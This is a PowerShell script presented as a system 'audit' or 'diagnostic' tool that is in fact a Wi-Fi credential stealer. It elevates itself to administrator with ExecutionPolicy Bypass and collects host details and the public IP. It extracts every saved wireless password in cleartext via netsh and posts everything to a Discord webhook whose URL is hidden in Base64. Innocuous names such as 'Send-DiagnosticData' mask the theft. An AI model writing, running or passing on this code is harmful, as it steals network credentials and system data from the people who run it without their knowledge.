# ========== CONFIG ==========
$VerboseMode = $true
$Version = "2.2.0"

# ========== ENCODED ENDPOINTS ==========
# Telegram removed per request
$D_Hook_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTU0MjQzOTU1NjAyMjMyMy9wN2E3by1ReDJlaUczdzZ2Y25rdV9LajZxS01NdXN2MGt2eWNVSWZPTi16V1ZRY3poYnV1QlBZYzB6X3YtZFg2cDJIYQ=="

# Runtime Decoding
$D_Hook = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($D_Hook_B64))

# ========== CORE UTILITIES ==========
function Write-InternalLog {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Msg,
        [string]$Col = "Cyan"
    )
    if ($VerboseMode) {
        Write-Host "[*] $Msg" -ForegroundColor $Col
    }
}

function Invoke-PrivilegeAssertion {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
        Write-InternalLog "Escalating context..."
        try {
            Start-Process -FilePath powershell -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$PSCommandPath`"" -Verb RunAs
        } catch {
            Write-InternalLog "Escalation failed: $($_.Exception.Message)" "Red"
        }
        exit 1
    }
}

# ========== DATA COLLECTION ==========
function Get-EnvironmentMetrics {
    Write-InternalLog "Collecting environment metrics..."
    try {
        $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
        $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
        $cpu = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue
        $gpu = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
        $mem = Get-CimInstance Win32_PhysicalMemory -ErrorAction SilentlyContinue | Measure-Object -Property Capacity -Sum
        $publicIp = try { (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5) } catch { "Unknown" }
        
        return [PSCustomObject]@{
            HostName     = $env:COMPUTERNAME
            Model        = if ($cs) { $cs.Model } else { "N/A" }
            Manufacturer = if ($cs) { $cs.Manufacturer } else { "N/A" }
            Platform     = if ($os) { $os.Caption } else { "N/A" }
            Build        = if ($os) { $os.Version } else { "N/A" }
            Processor    = if ($cpu) { ($cpu | Select-Object -First 1).Name } else { "N/A" }
            LogicCores   = if ($cpu) { ($cpu | Select-Object -First 1).NumberOfCores } else { 0 }
            MemoryGB     = if ($mem.Sum) { [Math]::Round($mem.Sum / 1GB, 2) } else { 0 }
            Graphics     = if ($gpu) { ($gpu | Select-Object -First 1).Name } else { "N/A" }
            ExternalIP   = $publicIp
            Timestamp    = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
            Revision     = $Version
        }
    } catch {
        Write-InternalLog "Metrics collection error: $($_.Exception.Message)" "Red"
        return $null
    }
}

function Get-NetworkCredentials {
    Write-InternalLog "Extracting network credentials..."
    try {
        $profiles = netsh wlan show profiles 2>$null |
            Select-String "All User Profile" |
            ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() } | Sort-Object -Unique

        $data = @()
        foreach ($p in $profiles) {
            $info = netsh wlan show profile name="$p" key=clear 2>$null
            $key = ($info | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() }) -join ''
            if (-not $key) { $key = "<Unsecured or No Local Cache>" }
            $data += [PSCustomObject]@{ SSID = $p; KeyValue = $key }
        }
        return $data
    } catch {
        Write-InternalLog "Credentials extraction error: $($_.Exception.Message)" "Red"
        return @()
    }
}

# ========== PACKAGE GENERATION ==========
function New-AuditPackage {
    param(
        [Parameter(Mandatory=$true)]
        $Metrics,
        [Parameter(Mandatory=$true)]
        $NetworkData
    )
    
    $report = @"
=========================================
      AUDIT PACKAGE - $Version
=========================================
METRICS:
-----------------------------------------
Host          : $($Metrics.HostName)
Model         : $($Metrics.Model)
Vendor        : $($Metrics.Manufacturer)
Platform      : $($Metrics.Platform) ($($Metrics.Build))
CPU           : $($Metrics.Processor) ($($Metrics.LogicCores) Cores)
RAM           : $($Metrics.MemoryGB) GB
GPU           : $($Metrics.Graphics)
External IP   : $($Metrics.ExternalIP)
Time          : $($Metrics.Timestamp)

CREDENTIALS:
-----------------------------------------
"@
    foreach ($c in $NetworkData) {
        $report += "`nSSID: $($c.SSID)`nKEY:  $($c.KeyValue)`n-----------------------------------------"
    }
    $report += "`n`n[PACKAGE COMPLETE]"
    return $report
}

# ========== DATA DISPATCH ==========
function Send-DiagnosticData {
    param(
        [Parameter(Mandatory=$true)]
        [string]$RawContent
    )
    
    Write-InternalLog "Dispatching via Channel D..."
    try {
        $safeContent = if ($RawContent.Length -gt 1900) { $RawContent.Substring(0, 1900) + "... [Truncated]" } else { $RawContent }
        
        $discordBody = @{
            content = "New Diagnostic Package from $($env:COMPUTERNAME)"
            embeds = @(@{
                title = "Audit Results"
                description = "```$safeContent```"
                color = 3447003
            })
        }
        
        $jsonBody = $discordBody | ConvertTo-Json -Depth 5
        Invoke-RestMethod -Uri $D_Hook -Method Post -Body $jsonBody -ContentType "application/json"
        Write-InternalLog "Channel D success." "Green"
    } catch {
        Write-InternalLog "Channel D fail: $($_.Exception.Message)" "Red"
    }
}

# ========== EXECUTION FLOW ==========
function Invoke-AuditFlow {
    Invoke-PrivilegeAssertion

    $Metrics = Get-EnvironmentMetrics
    if (-not $Metrics) { exit }

    $Creds = Get-NetworkCredentials
    $Package = New-AuditPackage -Metrics $Metrics -NetworkData $Creds

    # Dispatch
    Send-DiagnosticData -RawContent $Package

    Write-InternalLog "Audit flow complete." "Green"
}

# Run
Invoke-AuditFlow
